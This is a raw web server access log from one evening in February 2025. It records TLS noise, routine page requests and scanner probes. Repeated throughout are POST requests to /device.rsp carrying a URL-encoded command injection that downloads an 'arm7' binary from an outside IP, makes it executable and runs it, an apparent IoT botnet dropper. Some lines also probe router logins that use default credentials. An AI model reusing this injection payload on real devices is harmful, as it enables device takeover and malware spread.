127.0.0.1 - - [19/Feb/2025:20:11:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:11:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
194.120.230.215 - - [19/Feb/2025:20:12:29 +0300] "GET / HTTP/1.1" 200 18044
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:20:13:56 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
46.19.143.58 - - [19/Feb/2025:20:18:37 +0300] "GET / HTTP/1.1" 200 18044
127.0.0.1 - - [19/Feb/2025:20:21:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:21:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:20:23:03 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:20:27:58 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:20:31:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:31:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:20:32:21 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
208.110.70.42 - - [19/Feb/2025:20:35:49 +0300] "GET /restore.php HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:20:41:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:41:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:42:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:20:44:44 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
45.164.177.148 - - [19/Feb/2025:20:47:45 +0300] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 196
165.227.85.187 - - [19/Feb/2025:20:47:50 +0300] "GET / HTTP/1.1" 200 18044
172.202.252.105 - - [19/Feb/2025:20:48:30 +0300] "MGLNDD_128.68.240.10_80\n" 400 226
91.224.92.10 - - [19/Feb/2025:20:49:25 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
46.19.143.10 - - [19/Feb/2025:20:51:05 +0300] "GET / HTTP/1.1" 200 18044
127.0.0.1 - - [19/Feb/2025:20:51:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:51:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:51:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:51:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:20:53:07 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:20:57:33 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:21:01:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:01:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:01:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:01:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:21:03:15 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
164.52.24.188 - - [19/Feb/2025:21:06:32 +0300] "\x16\x03\x01\x02" 400 226
164.52.24.188 - - [19/Feb/2025:21:06:51 +0300] "GET / HTTP/1.1" 200 18116
164.52.24.188 - - [19/Feb/2025:21:06:54 +0300] "GET / HTTP/1.1" 200 18116
164.52.24.188 - - [19/Feb/2025:21:06:55 +0300] "GET /favicon.ico HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:21:09:57 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:21:11:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:11:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:12:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
83.217.199.99 - - [19/Feb/2025:21:14:49 +0300] "GET / HTTP/1.1" 200 18130
83.217.199.99 - - [19/Feb/2025:21:14:49 +0300] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 196
83.217.199.99 - - [19/Feb/2025:21:14:49 +0300] "GET /HNAP1/ HTTP/1.1" 404 196
92.246.87.21 - - [19/Feb/2025:21:18:01 +0300] "GET / HTTP/1.1" 200 18130
91.224.92.10 - - [19/Feb/2025:21:18:34 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
193.68.89.51 - - [19/Feb/2025:21:20:31 +0300] "GET / HTTP/1.1" 200 18165
127.0.0.1 - - [19/Feb/2025:21:21:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:21:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:21:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:21:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:21:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:21:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:21:27:50 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:21:29:45 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:21:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:21:32:53 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [19/Feb/2025:21:38:20 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:21:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:43:51 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:21:43:51 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:21:43:51 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:21:43:51 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
91.224.92.10 - - [19/Feb/2025:21:44:19 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
193.68.89.10 - - [19/Feb/2025:21:46:08 +0300] "GET / HTTP/1.1" 200 18175
127.0.0.1 - - [19/Feb/2025:21:48:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:21:48:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:21:48:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:21:48:43 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
91.224.92.10 - - [19/Feb/2025:21:50:31 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:21:52:57 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:21:52:57 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:21:53:45 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
46.19.143.58 - - [19/Feb/2025:21:54:24 +0300] "GET / HTTP/1.1" 200 16489
91.224.92.10 - - [19/Feb/2025:21:57:17 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:22:01:53 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:22:03:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:22:03:53 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [19/Feb/2025:22:13:26 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:22:13:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:22:13:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:22:23:50 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:22:23:50 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:22:25:31 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:25:31 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:25:31 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:25:31 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:26:13 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:26:13 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:22:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:22:34:44 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:34:44 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:22:43:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:22:43:53 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [19/Feb/2025:22:44:48 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
92.246.87.21 - - [19/Feb/2025:22:49:19 +0300] "GET / HTTP/1.1" 200 16835
172.169.2.251 - - [19/Feb/2025:22:51:23 +0300] "GET /ReportServer HTTP/1.1" 404 196
172.202.177.22 - - [19/Feb/2025:22:52:06 +0300] "GET /hudson HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:22:53:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:22:53:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
46.19.143.10 - - [19/Feb/2025:22:54:54 +0300] "GET / HTTP/1.1" 200 16835
